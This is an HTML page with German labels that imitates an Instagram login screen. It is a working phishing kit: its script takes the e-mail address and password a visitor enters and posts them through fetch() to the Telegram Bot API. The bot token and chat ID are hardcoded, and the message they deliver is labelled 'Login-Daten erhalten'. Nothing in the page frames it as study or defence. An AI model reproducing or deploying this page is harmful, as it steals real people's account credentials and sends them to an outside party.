<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #fafafa;
    }

    .login-container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 20px;
      width: 350px;
      text-align: center;
      border-radius: 8px;
    }

    .login-container h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #262626;
    }

    .login-container form {
      display: flex;
      flex-direction: column;
    }

    .login-container input {
      margin: 10px 0;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }

    .login-container button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }

    .login-container button:hover {
      background-color: #3078d9;
    }

    .login-container p {
      font-size: 12px;
      color: #8e8e8e;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Instagram</h1>
    <form id="loginForm">
      <input type="email" id="email" placeholder="E-Mail-Adresse" required>
      <input type="password" id="password" placeholder="Passwort" required>
      <button type="button" onclick="sendToTelegram()">Anmelden</button>
    </form>
    <p>Â© 2025 Instagram Clone</p>
  </div>

  <script>
    // Telegram-Bot-Informationen
    const BOT_TOKEN = "7433787133:AAHuCXGJgERrcUwvb4adFMTlv8EX7e-upZY"; // Bot-Token
    const CHAT_ID = "6640486406";   // Deine Chat-ID

    // Funktion zum Senden der Daten an Telegram
    function sendToTelegram() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Eingaben prÃ¼fen
      if (!email || !password) {
        alert("Bitte alle Felder ausfÃ¼llen!");
        return;
      }

      // Nachricht erstellen (String-Konkatenation)
      const message = "ðŸ›‘ Login-Daten erhalten:\n\nðŸ“§ E-Mail: " + email + "\nðŸ”‘ Passwort: " + password;
      console.log("Nachricht, die gesendet wird:", message);

      // Telegram-API-URL
      const telegramApiUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

      // Nachricht an Telegram senden
      fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      })
        .then(function (response) {
          console.log("HTTP-Statuscode:", response.status); // Statuscode anzeigen
          return response.json();
        })
        .then(function (data) {
          console.log("Telegram API Antwort:", data); // VollstÃ¤ndige API-Antwort
          if (data.ok) {
            alert("Daten erfolgreich gesendet!");
          } else {
            console.error("Telegram-Fehler:", data.description);
            alert("Fehler: " + data.description);
          }
        })
        .catch(function (error) {
          console.error("Fehler beim Senden:", error);
          alert("Ein Fehler ist aufgetreten: " + error.message);
        });
    }
  </script>
</body>
</html>
